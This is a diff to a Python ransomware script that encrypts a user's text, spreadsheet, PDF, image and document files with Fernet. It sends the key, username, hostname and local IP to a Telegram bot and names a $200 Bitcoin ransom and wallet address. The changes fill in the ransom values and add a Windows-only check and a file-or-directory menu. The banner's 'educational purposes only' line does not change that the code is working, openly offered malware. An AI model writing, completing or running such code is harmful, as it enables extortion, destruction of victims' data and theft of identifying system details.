@@ -1,4 +1,4 @@
-import zalpran
+import os
 import time
 import socket
 import cryptography
@@ -7,15 +7,16 @@ import time
 import telegram
 import requests
 from datetime import datetime
+import threading
+import sys
 
-
-TOKEN = "TOKEN_HERE"
-chat_id = "ID_HERE"
+TOKEN = "12222"
+chat_id = "TELEGRAM_CHAT_ID_HERE"
 
 
 keyGen = Fernet.generate_key()
-priceToAsk = "PRICE_HERE"
-wallet_url = "WALLET_HERE"
+priceToAsk = "$200"
+wallet_url = "1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383"
 currency = "Bitcoin"
 
 extensions = [
@@ -40,7 +41,9 @@ def banner():
 |  $$    \| $$  | $$| $$     \| $$      | $$  | $$| $$  | $$ \$$    $$ \$$    $$
  \$$$$$$$$ \$$   \$$ \$$$$$$$$ \$$       \$$   \$$ \$$   \$$  \$$$$$$   \$$$$$$ 
  Use for educational purposes only :)
+ 
  Github: github.com/dave-zalp
+ 
  btc: 1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383
  
                                                                                 
@@ -49,24 +52,33 @@ def banner():
     print(banner);
     time.sleep(3)
 
+def detect_os():
+    if os.name != 'nt':
+        sys.exit()
+
+
+
 
 
 def encryptIndividualFile(File):
     #  File = input("Enter File path to encrypt:  ")
-      if zalpran.path.exists(File):
+      if os.path.exists(File):
             with open('seckey.txt', 'wb') as _key:
                 _key.write(keyGen)
                 currentDateAndTime = datetime.now()
-                USER = zalpran.getlogin()
+                USER = os.getlogin()
                 Hostname = socket.gethostname()
                 LOCAL_IP = socket.gethostbyname(Hostname)
                 keytext = f"key: {keyGen}\n name: {USER}\n Hostname: {Hostname} \n LOCAL-IP: {LOCAL_IP} \nDate: {currentDateAndTime}"
                 url1 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={keytext}"
                 try:
                     data = requests.get(url1)
-                except ConnectionError:
-                    print('Error')
-                    time.sleep(10)
+                except requests.exceptions.ConnectionError:
+                    print('Connection Error')
+                    print('Retrying Requests......')
+                    time.sleep(2)
+                    print('Ensure you have Internet Connectivity....')
+                    time.sleep(6)
                     encryptIndividualFile(File)
                 print(data.json())
                 with open(File, 'rb') as encfile:
@@ -80,7 +92,7 @@ def encryptIndividualFile(File):
 
 def decryptIndividualFile():
       File = input("Enter File path to decrypt:  ")
-      if zalpran.path.exists(File):
+      if os.path.exists(File):
             with open('seckey.txt', 'rb') as _key:
                 encrypkey = _key.read()
                 with open(File, 'rb') as decfile:
@@ -96,21 +108,34 @@ def decryptIndividualFile():
 def encryptDir():
     res=[]
     Directory = input('Enter Path of Directory: ')
-    if zalpran.path.isdir(Directory):
-        for root, dirs, files in zalpran.walk(Directory):
+    if os.path.isdir(Directory):
+        for root, dirs, files in os.walk(Directory):
             for file in files:
                 if file.endswith(".txt") or file.endswith(".csv") or file.endswith(".pdf") or file.endswith(".jpg") or file.endswith(".png") or file.endswith(".xls") or file.endswith(".doc") :
-                    res.append(zalpran.path.join(root, file))
+                    res.append(os.path.join(root, file))
         for filepaths in res:
            encryptIndividualFile(filepaths)
 
     else:
         print('NOT A DIRECTORY')
-        zalpran.system('exit')
+        os.system('exit')
 
 def main():
     banner()
-    encryptDir()
+    detect_os()
+    choice = input('Do you want to encript a file or a direcitory? [F/D]:  ')
+    if choice == 'F':
+        path = input('Enter path of file: ')
+        if path == '':
+            print('No file Specified! ')
+            os.system('exit')
+        else:
+            encryptIndividualFile(path)
+    elif choice == 'D':
+        encryptDir()
+    else:
+        print("[-] INVALID ARGUMENT, choice must be 'F' or 'D' !")
+        main()
 
 if __name__ == '__main__':
     main()
